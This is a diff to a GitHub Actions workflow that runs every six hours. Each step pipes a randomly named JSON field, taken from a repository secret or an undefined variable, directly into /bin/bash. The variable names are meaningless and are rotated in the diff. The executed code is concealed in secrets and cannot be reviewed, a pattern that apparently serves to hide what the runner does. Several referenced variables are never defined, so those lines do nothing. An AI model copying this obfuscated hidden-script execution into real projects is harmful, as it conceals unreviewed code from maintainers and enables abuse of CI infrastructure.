@@ -3,25 +3,28 @@ name: canrongca
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 1/6 * * *'
+    - cron: '40 5/6 * * *'
 
-jobs:  # 17363
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: canrongca
         env:
-          jkp37600: ${{ secrets.jkp37600 }}
+          p92964: ${{ secrets.p92964 }}
         run: |
-          echo $jkp37600 | jq -r .ctc2 | /bin/bash
-          echo $y550 | jq -r .yy0 | /bin/bash
-          echo $j8390 | jq -r .ldq02558 | /bin/bash
-          echo $wn399 | jq -r .kbrsd45468 | /bin/bash
-          echo $xwnq7 | jq -r .gn78 | /bin/bash
-          echo $ncxsf23324 | jq -r .i4 | /bin/bash
-          echo $nb02 | jq -r .guae59 | /bin/bash
-          echo $pg3429 | jq -r .lomx52651 | /bin/bash
-          echo $qjzqj584 | jq -r .zt3402 | /bin/bash
-          echo $s9 | jq -r .q365 | /bin/bash
+          echo $p92964 | jq -r .tmv11949 | /bin/bash
+          echo $md8250 | jq -r .jdge9227 | /bin/bash
+          echo $mk82837 | jq -r .vccw19975 | /bin/bash
+          echo $n8 | jq -r .aw1832 | /bin/bash
+          echo $fj1374 | jq -r .ykuge999 | /bin/bash
+          echo $y02234 | jq -r .yg2279 | /bin/bash
+          echo $qbsas4140 | jq -r .jansh3335 | /bin/bash
+          echo $vcia08591 | jq -r .qs362 | /bin/bash
+          echo $ypsz69 | jq -r .v4 | /bin/bash
+          echo $p81 | jq -r .dmx62099 | /bin/bash
+          echo $v44 | jq -r .fg03 | /bin/bash
+          echo $kbvy8074 | jq -r .itrlc6847 | /bin/bash
+          echo $rgi0 | jq -r .jbvcp97 | /bin/bash
 
